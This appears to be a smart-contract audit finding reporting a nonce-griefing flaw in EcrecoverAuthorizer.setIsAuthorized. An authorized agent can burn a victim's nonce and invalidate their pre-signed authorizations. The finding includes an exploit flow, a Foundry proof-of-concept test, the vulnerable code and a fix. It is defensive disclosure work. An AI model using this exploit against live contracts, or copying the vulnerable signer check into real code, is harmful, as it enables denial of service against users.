### Title
Authorized Agent Can Increment Victim's Nonce via No-Op `setIsAuthorized`, Invalidating Pending Pre-Signed Authorizations - (File: src/periphery/EcrecoverAuthorizer.sol)

### Summary
`EcrecoverAuthorizer.setIsAuthorized` permits any address that is an authorized agent of the `authorization.authorizer` to sign and submit an `Authorization` struct on the authorizer's behalf. Because the nonce for `authorization.authorizer` is unconditionally incremented on every successful call, an authorized agent can craft a no-op authorization (e.g., `authorized=victim, isAuthorized=true`) and submit it to burn the victim's current nonce, permanently invalidating any pre-signed authorization the victim has distributed off-chain. The invariant that nonce advancement requires the authorizer's own explicit consent is broken.

### Finding Description
**Code path:**

`EcrecoverAuthorizer.setIsAuthorized` — `src/periphery/EcrecoverAuthorizer.sol` lines 24–48.

**Root cause:**

Line 26 unconditionally increments `nonce[authorization.authorizer]` for every successful call: [1](#0-0) 

The signer check at lines 33–36 accepts either the authorizer themselves **or any address that `IMidnight.isAuthorized(authorizer, signer)` returns `true` for**: [2](#0-1) 

`IMidnight.isAuthorized` is a flat mapping set by `Midnight.setIsAuthorized`: [3](#0-2) 

**Attacker inputs and exploit flow:**

1. Precondition: `isAuthorized[victim][attacker] == true` (victim previously authorized attacker as an agent).
2. Victim signs and distributes off-chain: `Authorization(authorizer=victim, authorized=X, isAuthorized=true, nonce=N, deadline=T)`.
3. Attacker constructs `Authorization(authorizer=victim, authorized=victim, isAuthorized=true, nonce=N, deadline=far_future)` — a no-op.
4. Attacker signs this struct with their own key and calls `EcrecoverAuthorizer.setIsAuthorized(authorization, attackerSig)`.
5. `ecrecover` returns `attacker`; the check `isAuthorized(victim, attacker) == true` passes.
6. `nonce[victim]` is incremented from `N` to `N+1`.
7. The victim's pre-signed authorization with `nonce=N` now fails `InvalidNonce()` when anyone tries to submit it.

**Why existing checks fail:**

The `Unauthorized()` guard only verifies that the signer is the authorizer or a delegated agent — it does not restrict agents from consuming the authorizer's nonce. There is no check that the submitted authorization was actually signed by `authorization.authorizer` themselves (i.e., no `require(signer == authorization.authorizer)`). The no-op nature of the state change (`isAuthorized[victim][victim]`) means the call succeeds with zero meaningful side-effect other than the nonce burn. [4](#0-3) 

### Impact Explanation
Any pending pre-signed `Authorization` (used to gaslessly delegate `take`, `repay`, `withdraw`, `withdrawCollateral`, `liquidate`, or `claimFee` actions via `EcrecoverAuthorizer`) can be invalidated by a single attacker transaction. The victim must re-sign and re-distribute a new authorization with `nonce=N+1`, which the attacker can immediately invalidate again. This creates a sustained, low-cost DoS against all gasless authorization flows in the protocol.

### Likelihood Explanation
**Preconditions:** The attacker must already be an authorized agent of the victim (`isAuthorized[victim][attacker] == true`). This is a realistic state: users routinely authorize relayers, bots, or smart contract operators. Once the precondition holds, the attack costs one transaction per invalidation and is fully repeatable. The victim cannot escape by revoking the attacker's authorization via a pre-signed message, because that pre-signed revocation would itself be subject to the same nonce-burn attack.

### Recommendation
Restrict nonce advancement to signatures produced by the authorizer themselves. Change the signer check to require `signer == authorization.authorizer` exclusively, removing the delegated-agent branch from `EcrecoverAuthorizer`:

```solidity
// Before (vulnerable):
require(
    signer == authorization.authorizer || IMidnight(MIDNIGHT).isAuthorized(authorization.authorizer, signer),
    Unauthorized()
);

// After (fixed):
require(signer == authorization.authorizer, Unauthorized());
```

This preserves the intended use-case (the authorizer pre-signs off-chain and anyone can submit) while ensuring only the authorizer's own key can advance their nonce.

### Proof of Concept
```solidity
// SPDX-License-Identifier: GPL-2.0-or-later
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import {EcrecoverAuthorizer, Authorization, Signature, AUTHORIZATION_TYPEHASH, EIP712_DOMAIN_TYPEHASH} from "src/periphery/EcrecoverAuthorizer.sol";
import {Midnight} from "src/Midnight.sol";

contract NonceGriefTest is Test {
    Midnight midnight;
    EcrecoverAuthorizer authorizer;

    uint256 victimKey   = 0xA11CE;
    uint256 attackerKey = 0xBAD;
    address victim;
    address attacker;

    function setUp() public {
        midnight   = new Midnight();
        authorizer = new EcrecoverAuthorizer(address(midnight));
        victim     = vm.addr(victimKey);
        attacker   = vm.addr(attackerKey);

        // Victim authorizes attacker as an agent on Midnight core
        vm.prank(victim);
        midnight.setIsAuthorized(attacker, true, victim);
    }

    function _sign(uint256 key, Authorization memory auth) internal view returns (Signature memory sig) {
        bytes32 hashStruct = keccak256(abi.encode(AUTHORIZATION_TYPEHASH, auth));
        bytes32 domain     = keccak256(abi.encode(EIP712_DOMAIN_TYPEHASH, block.chainid, address(authorizer)));
        bytes32 digest     = keccak256(bytes.concat("\x19\x01", domain, hashStruct));
        (sig.v, sig.r, sig.s) = vm.sign(key, digest);
    }

    function testAttackerBurnsVictimNonce() public {
        // Victim pre-signs a legitimate authorization (nonce=0)
        Authorization memory legitAuth = Authorization({
            authorizer:   victim,
            authorized:   makeAddr("someAgent"),
            isAuthorized: true,
            nonce:        0,
            deadline:     block.timestamp + 1 days
        });
        Signature memory legitSig = _sign(victimKey, legitAuth);

        // Attacker crafts a no-op authorization for victim (nonce=0) and signs with attacker key
        Authorization memory noopAuth = Authorization({
            authorizer:   victim,
            authorized:   victim,
            isAuthorized: true,
            nonce:        0,
            deadline:     block.timestamp + 1 days
        });
        Signature memory noopSig = _sign(attackerKey, noopAuth);

        assertEq(authorizer.nonce(victim), 0);

        // Attacker submits the no-op — succeeds because attacker is authorized agent
        vm.prank(attacker);
        authorizer.setIsAuthorized(noopAuth, noopSig);

        // Assert: victim's nonce is now 1
        assertEq(authorizer.nonce(victim), 1);

        // Assert: victim's legitimate pre-signed authorization is now invalid
        vm.expectRevert(EcrecoverAuthorizer.InvalidNonce.selector);
        authorizer.setIsAuthorized(legitAuth, legitSig);
    }
}
```

**Expected assertions:**
- `authorizer.nonce(victim)` advances from `0` to `1` after the attacker's no-op call.
- The victim's legitimate pre-signed authorization reverts with `InvalidNonce()`.

    function setIsAuthorized(Authorization memory authorization, Signature calldata signature) external {
        require(block.timestamp <= authorization.deadline, Expired());
        require(authorization.nonce == nonce[authorization.authorizer]++, InvalidNonce());

        bytes32 hashStruct = keccak256(abi.encode(AUTHORIZATION_TYPEHASH, authorization));
        bytes32 domainSeparator = keccak256(abi.encode(EIP712_DOMAIN_TYPEHASH, block.chainid, address(this)));
        bytes32 digest = keccak256(bytes.concat("\x19\x01", domainSeparator, hashStruct));
        address signer = ecrecover(digest, signature.v, signature.r, signature.s);
        require(signer != address(0), InvalidSignature());
        require(
            signer == authorization.authorizer || IMidnight(MIDNIGHT).isAuthorized(authorization.authorizer, signer),
            Unauthorized()
        );

        emit SetIsAuthorized(
            msg.sender,
            authorization.authorizer,
            authorization.authorized,
            authorization.isAuthorized,
            authorization.nonce
        );

        IMidnight(MIDNIGHT)
            .setIsAuthorized(authorization.authorized, authorization.isAuthorized, authorization.authorizer);
    }
